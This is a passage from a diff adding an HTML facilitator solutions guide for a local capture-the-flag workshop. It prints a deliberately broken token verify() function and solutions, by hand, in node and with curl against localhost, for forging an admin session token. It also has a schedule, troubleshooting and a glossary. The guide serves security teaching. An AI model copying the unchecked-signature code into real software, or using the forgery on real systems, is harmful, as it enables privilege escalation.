+  <span class="kw">const</span> parts = token.split(<span class="str">'.'</span>)
+  <span class="kw">if</span> (parts.length !== 2) <span class="kw">return</span> <span class="kw">null</span>
+  <span class="kw">if</span> (!parts[0] || !parts[1]) <span class="kw">return</span> <span class="kw">null</span>     <span class="cmt">// ← shape only</span>
+  <span class="kw">return</span> JSON.parse(Buffer.from(parts[0], <span class="str">'base64url'</span>).toString(<span class="str">'utf8'</span>))  <span class="cmt">// ← payload trusted as-is</span>
+}
+
+<span class="kw">function</span> adminPanel(req, res) {
+  <span class="kw">const</span> payload = verify(bearer(req))
+  <span class="kw">if</span> (!payload) <span class="kw">return</span> json(res, 401, { error: <span class="str">'invalid session'</span> })
+  <span class="kw">if</span> (payload.role !== <span class="str">'admin'</span>) <span class="kw">return</span> json(res, 403, { error: <span class="str">'staff role required for the internal panel'</span> })
+  json(res, 200, { panel: <span class="str">'neoncart internal'</span>, <span class="bad">staff_code: deriveFlag(readLicense().seed, SALT)</span> })
+}</code></pre>
+
+<h4>Solution — by hand (no tooling)</h4>
+<ol class="steps">
+  <li><strong>Click “Account”</strong> in the nav bar. Under “Active session” the token this browser is signed in with is already in the box.</li>
+  <li><strong>Split it on the dot.</strong> The part before the dot is the payload, base64url encoded.</li>
+  <li><strong>Decode it:</strong> in a terminal <code>echo eyJ1c2VyX2lkIjo0Miwi… | base64 -d</code> → you see <code>{"user_id":42,"role":"user","issued_at":…}</code>.</li>
+  <li><strong>Change <code>"role":"user"</code> to <code>"role":"admin"</code></strong> and re-encode: <code>echo -n '{"user_id":42,"role":"admin","issued_at":1}' | base64 -w0 | tr '+/' '-_' | tr -d '='</code></li>
+  <li><strong>Keep the original signature</strong> (everything after the dot) — the server never checks it.</li>
+  <li><strong>Paste the new token</strong> into the token box, press <b>Open staff panel</b> → <code>staff_code</code> is <span class="flag">FLAG{…}</span>.</li>
+</ol>
+
+<h4>Solution — one line of node</h4>
+<pre><code>node -e <span class="str">"
+const t='&lt;token from Issue session&gt;';
+const [p,s]=t.split('.');
+const pl=JSON.parse(Buffer.from(p,'base64url').toString('utf8'));
+pl.role='admin';
+console.log(Buffer.from(JSON.stringify(pl)).toString('base64url')+'.'+s);
+"</span></code></pre>
+
+<h4>Solution — with curl</h4>
+<pre><code><span class="cmt"># 1. get a token</span>
+curl -s -X POST http://localhost:3307/api/session/issue \
+  -H <span class="str">'content-type: application/json'</span> -d <span class="str">'{"user_id":42}'</span>
+
+<span class="cmt"># 2. flip the role in the payload, keep the signature</span>
+<span class="cmt">#    (see the node one-liner above)</span>
+
+<span class="cmt"># 3. open the panel with the forged token</span>
+curl -s http://localhost:3307/api/admin/panel -H <span class="str">'authorization: Bearer &lt;forged&gt;'</span>
+<span class="cmt"># {"panel":"neoncart internal","staff_code":"FLAG{…}"}</span></code></pre>
+
+<div class="card tip">
+  <h4>What the log shows</h4>
+  <p>
+    <code>warn [session] internal panel refused: token role is "user", panel needs "admin"</code><br />
+    <code>info [session] internal panel opened with a staff token</code>
+  </p>
+</div>
+
+<div class="card">
+  <h4>Where players get stuck</h4>
+  <ul>
+    <li>They assume the signature protects the payload and try to crack it. It does not — the server never recomputes it.</li>
+    <li>They never find the token. It is on the Account page, in the “Active session” box.</li>
+    <li>They edit the payload but forget to re-encode base64url, or they re-encode with standard base64 (<code>+</code> and <code>/</code> instead of <code>-</code> and <code>_</code>).</li>
+    <li>They re-encode and lose the trailing <code>=</code> padding — that is fine, it is optional.</li>
+    <li>They try to change the signature instead. Read the <code>verify()</code> function again: it checks the shape, never the value.</li>
+  </ul>
+  <h4>Hints, in order</h4>
+  <div class="hintlvl"><b>1.</b> What exactly does <code>verify()</code> compare? Nothing — it only checks the token has two non-empty parts.</div>
+  <div class="hintlvl"><b>2.</b> The payload is base64url. Decode it, look at the fields, and ask which one the panel checks.</div>
+  <div class="hintlvl"><b>3.</b> The Account page shows your session token. Decode it, set <code>role:"admin"</code>, re-encode, keep the signature.</div>
+</div>
+
+<!-- ============================ TIMELINE ============================ -->
+<h2 id="timeline"><span class="num">09.</span> Suggested run of show</h2>
+
+<p>
+  This is one possible 90-minute schedule. Releases happen immediately when
+  the facilitator presses <b>Release</b> in the local admin panel; adapt the
+  timing to the room. There are no countdowns or automatic releases.
+</p>
+
+<table>
+  <thead>
+    <tr><th>Clock</th><th>Admin does</th><th>Players experience</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><b>00:00</b></td>
+      <td>Welcome the room, explain the rules, and distribute the portal link and individual accounts.</td>
+      <td>Sign in and confirm that the portal opens.</td>
+    </tr>
+    <tr>
+      <td><b>00:10</b></td>
+      <td>Release <b>module 00</b>.</td>
+      <td>Download, extract, run it with the seed shown in the portal. The storefront prints the build key — the first flag and a walkthrough of the submission loop.</td>
+    </tr>
+    <tr>
+      <td><b>00:20</b></td>
+      <td>Release <b>module 01</b>.</td>
+      <td>Introduce the first bug-finding challenge.</td>
+    </tr>
+    <tr>
+      <td><b>00:30</b></td>
+      <td>Release <b>module 02</b> as soon as the room is moving.</td>
+      <td>IDOR; give players time to compare the list and detail behavior.</td>
+    </tr>
+    <tr>
+      <td><b>00:45</b></td>
+      <td>Give a verbal hint if needed. Release <b>module 03</b>.</td>
+      <td>Client price. The first "money" module gets attention.</td>
+    </tr>
+    <tr>
+      <td><b>01:00</b></td>
+      <td>Release <b>module 04</b>. Announce: "one module left".</td>
+      <td>Path traversal. Expect the first real searching.</td>
+    </tr>
+    <tr>
+      <td><b>01:15</b></td>
+      <td>Release <b>module 05</b> (finale).</td>
+      <td>Token forgery — the biggest idea of the session.</td>
+    </tr>
+    <tr>
+      <td><b>01:30</b></td>
+      <td>Stop submissions and show the admin-only leaderboard.</td>
+      <td>Debrief: name each bug class and discuss how to fix it.</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="card warn">
+  <h4>Do not let module 00 turn into a code-reading lecture</h4>
+  <p>
+    Module 00 carries a flag, but it is printed, not broken. Give it ten
+    minutes: the point is that the room learns the loop — download, run, read
+    the response, submit — before any bug is on the table. Then release
+    module 01 and let the first real capture turn "I am reading code" into
+    "I am breaking code".
+  </p>
+</div>
+
+<!-- ============================ TROUBLE ============================ -->
+<h2 id="trouble"><span class="num">10.</span> Troubleshooting</h2>
+
+<table>
+  <thead>
+    <tr><th>Symptom</th><th>Cause</th><th>Fix</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Player says "the flag is wrong"</td>
+      <td>The app may be running without that player's seed, or the player may have copied someone else's flag.</td>
+      <td>Check the <code>PLAYER_SEED</code> command from their portal account, or inspect their local <code>config/player-license.json</code>. Each player's flag is different.</td>
+    </tr>
+    <tr>
+      <td>The first flag does not appear</td>
+      <td>The player may have skipped the seed or not extracted the archive.</td>
+      <td>Run the command shown in the portal, or replace the placeholder in <code>config/player-license.json</code> with their portal seed. Make sure they extracted the zip before running it.</td>
+    </tr>
+    <tr>
+      <td>"administrator mode not enabled" / 403s everywhere</td>
+      <td>The flag path is guarded, but the exploit did not land.</td>
+      <td>Check the log page. It prints exactly what the server did with the request.</td>
+    </tr>
+    <tr>
+      <td>Two players claim the same flag</td>
+      <td>They may have used the same submitted text, or one may have run the app with the wrong seed.</td>
+      <td>Check each player's portal seed and the command they used to start the app. Flags are derived per player.</td>
+    </tr>
+    <tr>
+      <td>Port 3307 already in use</td>
+      <td>A previous copy of the app is still running.</td>
+      <td><code>PORT=3308 node server.js</code> — the port is only a convention.</td>
+    </tr>
+    <tr>
+      <td>A released module still shows as locked</td>
+      <td>The portal does not continuously refresh module release status.</td>
+      <td>Use that module's <b>Refresh status</b> button or reload the portal.</td>
+    </tr>
+    <tr>
+      <td>Player sign-in succeeds but the portal says the account has no access</td>
+      <td>The account is missing the <code>player</code> label or its player row.</td>
+      <td>Create the account from the local admin panel and check that player creation completed. Do not add the label from the player-facing portal.</td>
+    </tr>
+  </tbody>
+</table>
+
+<!-- ============================ GLOSSARY ============================ -->
+<h2 id="glossary"><span class="num">11.</span> Glossary for players</h2>
+
+<table>
+  <thead>
+    <tr><th>Term</th><th>In one sentence</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>IDOR</td><td>Insecure Direct Object Reference — asking for a record by id and the server hands it over without checking it is yours.</td></tr>
+    <tr><td>Path traversal</td><td>User input that is joined onto a file path and then walks out of the intended folder with <code>../</code>.</td></tr>
+    <tr><td>Client-side trust</td><td>Believing a number the browser sent. The browser is on the player's side, so nothing it sends is authoritative.</td></tr>
+    <tr><td>Signature</td><td>The part of a token that proves it was issued by the server — but only if the server actually checks it.</td></tr>
+    <tr><td>base64url</td><td>An encoding, not encryption. Anyone can decode a base64url string, so never put a secret in a payload.</td></tr>
+    <tr><td>Exploit</td><td>Input that makes the server do something it should not.</td></tr>
+  </tbody>
+</table>
+
+<footer>
+  <p>
+    <strong>NeonCart Bug Hunt</strong> — facilitator solutions guide.
+    The checked-in screenshots are reference captures. The script at
+    <code>docs/tools/capture-screenshots.js</code> captures the challenge app;
+    refresh portal screenshots in a signed-in browser session.
+    The challenge content lives in <code>modules-source/stage-defs/extras/stage-NN/</code>;
+    the exact code quoted here is from those files.
+  </p>
+</footer>
+
+</div>
+<script>
+  (function () {
+    var btn = document.getElementById('themebtn');
+    var saved = localStorage.getItem('guide-theme');
+    if (saved === 'light') document.documentElement.classList.add('light');
+    function label() { btn.textContent = document.documentElement.classList.contains('light') ? '☀ Light' : '☾ Dark'; }
+    label();
+    btn.addEventListener('click', function () {
+      document.documentElement.classList.toggle('light');
+      localStorage.setItem('guide-theme', document.documentElement.classList.contains('light') ? 'light' : 'dark');
+      label();
+    });
+  })();
+</script>
+</body>
+</html>
